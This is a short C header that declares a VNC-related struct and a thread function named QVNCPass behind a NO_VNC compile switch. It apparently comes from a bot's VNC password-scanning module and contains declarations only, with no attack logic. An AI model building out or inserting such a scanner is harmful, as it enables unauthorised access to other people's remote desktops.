#ifndef NO_VNC

typedef struct QVNCP {
	SOCKET Sock;
	int Uptime;
	int ThreadNum;
	BOOL GotInfo;
}QVNCP;

DWORD WINAPI QVNCPass(LPVOID param);

#endif